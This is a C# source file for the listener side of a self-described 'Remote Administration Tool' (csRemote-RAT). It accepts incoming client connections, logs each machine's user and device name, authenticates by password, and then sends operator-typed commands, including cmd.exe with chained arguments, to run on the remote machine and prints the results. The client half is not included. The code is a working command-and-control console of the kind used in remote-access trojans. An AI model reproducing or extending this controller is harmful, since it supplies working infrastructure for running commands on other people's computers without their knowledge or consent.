using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

Thread refreshThread;
Socket socket;
List<Socket> socketList = new List<Socket>();
List<Client> clientList = new List<Client>();
IPAddress address;
int port;

/// <summary>
/// Menu ID values:
///
/// 0 = Port Select
/// 1 = Client List
/// 2 = Password Check
/// 3 = Remote Console
/// </summary>
int menuID = 0;

string input;

IPHostEntry ipHostEntry = Dns.GetHostEntry(Dns.GetHostName());

while(true)
{
        ShowTitle();

        for(int i = 0; i < ipHostEntry.AddressList.Length; i++)
        {
                Console.WriteLine($"[{i}] {ipHostEntry.AddressList[i]}");
        }
        Console.WriteLine();
        Console.WriteLine("Please select IP address to listen:");
        try {
                int addressIndex = Convert.ToInt32(Console.ReadLine());
                address = ipHostEntry.AddressList[addressIndex];
                break;
        }
        catch {}
}

while(true)
{
        ShowTitle();

        try {
        Console.WriteLine("Please enter port to listen:");
        port = Convert.ToInt32(Console.ReadLine());

        IPEndPoint endPoint = new IPEndPoint(address, port);
        socket = new Socket(SocketType.Stream, ProtocolType.Tcp);
        socket.Bind(endPoint);
        socket.Listen(10);
        break;
        }
        catch {}
}

menuID = 1;

MainMenu();

refreshThread = new Thread(WaitForConnect);
refreshThread.Start();

        while(menuID == 1)
        {
                input = Console.ReadLine();

                if(input == "x")
                {
                        BuildClientMenu();
                        break;
                }
                else
                {
                        try
                        {
                                ConnectToClient(Convert.ToInt32(input));
                                break;
                        }
                        catch { }
                }
        }

void ShowTitle()
{
Console.Clear();

Console.ForegroundColor = ConsoleColor.DarkCyan;
Console.BackgroundColor = ConsoleColor.Black;

Console.WriteLine(@"
              ░██████╗░███████╗███╗░░░███╗░█████╗░████████╗███████╗
              ░██╔══██╗██╔════╝████╗░████║██╔══██╗╚══██╔══╝██╔════╝
 ▄▄▄▄▄ ▄▄▄▄▄  ░██████╔╝█████╗░░██╔████╔██║██║░░██║░░░██║░░░█████╗░░
█─▄▄▄─█─▄▄▄▄█ ░██╔══██╗██╔══╝░░██║╚██╔╝██║██║░░██║░░░██║░░░██╔══╝░░
█─███▀█▄▄▄▄─█ ░██║░░██║███████╗██║░╚═╝░██║╚█████╔╝░░░██║░░░███████╗
▀▄▄▄▄▄▀▄▄▄▄▄▀ ░╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝░╚════╝░░░░╚═╝░░░╚══════╝
");

Console.ForegroundColor = ConsoleColor.Yellow;

Console.WriteLine("C# Remote Administration Tool");

Console.ForegroundColor = ConsoleColor.DarkYellow;

Console.WriteLine("https://github.com/diveloper53/csRemote-RAT/");
Console.WriteLine();

Console.ForegroundColor = ConsoleColor.White;
}

void WaitForConnect()
{
        while(menuID == 1)
        {
                Socket client = socket.Accept();
                byte[] buffer = new byte[8196];
                int bytesRecorded = client.Receive(buffer);
                string name = Encoding.UTF8.GetString(buffer, 0, bytesRecorded);
                string[] names = name.Split('\\');
                clientList.Add(new Client() { clientName = names[0], userName = names[1], deviceName = names[2], ip = client.RemoteEndPoint });
                socketList.Add(client);

                MainMenu();
        }
}

void MainMenu()
{
        if(menuID == 1)
        {
                ShowTitle();
                for(int i = 0; i < clientList.Count; i++)
                {
                        Console.WriteLine($"[{i}] {clientList[i].clientName} | IP: {clientList[i].ip} | Username: {clientList[i].userName} | Device: {clientList[i].deviceName}");
                }

                Console.WriteLine();
                Console.WriteLine("[x] Build Client");
                Console.WriteLine("----------------");
                Console.WriteLine("[Ctrl] + [C] Quit");
                Console.WriteLine();
                Console.WriteLine("Select action:");
        }
}

void ConnectToClient(int id)
{
        menuID = 2;

        int bytesRecorded;
        byte[] buffer = new byte[8196];
        string answer = String.Empty;
        while(answer != "Connected")
        {
                ShowTitle();
                Console.WriteLine($"{clientList[id].clientName} [IP: {clientList[id].ip}]");
                Console.WriteLine();
                Console.WriteLine(answer);
                Console.WriteLine("Please enter password:");
                socketList[id].Send(Encoding.UTF8.GetBytes(Console.ReadLine()));

                bytesRecorded = socketList[id].Receive(buffer);
                answer = Encoding.UTF8.GetString(buffer, 0, bytesRecorded);
        }

        menuID = 3;

        ShowTitle();
        Console.WriteLine("Connection accepted! You can start process using it name, example: \"cmd.exe\"\nTo add arguments use \"@\", example: \"cmd.exe @ /C echo Hello World!\"\nAlso you can use & symbol to start more then 1 command, example: \"cmd.exe /C echo Command 1 & echo Command 2\"\nFor more info about process arguments type \"process.exe @ /?\"");

        while(true)
        {
                socketList[id].Send(Encoding.UTF8.GetBytes(Console.ReadLine()));

                bytesRecorded = socketList[id].Receive(buffer);
                answer = Encoding.UTF8.GetString(buffer, 0, bytesRecorded);
                Console.WriteLine(answer);
        }
}

void BuildClientMenu()
{
        ShowTitle();
        Console.WriteLine("To build client use source code. Sorry but I'm too lazy to add client build feature here... ;P");
        Console.WriteLine();
        Console.WriteLine("Maybe in feature updates? If they will be...");
}

struct Client
{
        public string clientName { get; set; }
        public string userName { get; set; }
        public string deviceName { get; set; }
        public EndPoint ip { get; set; }
}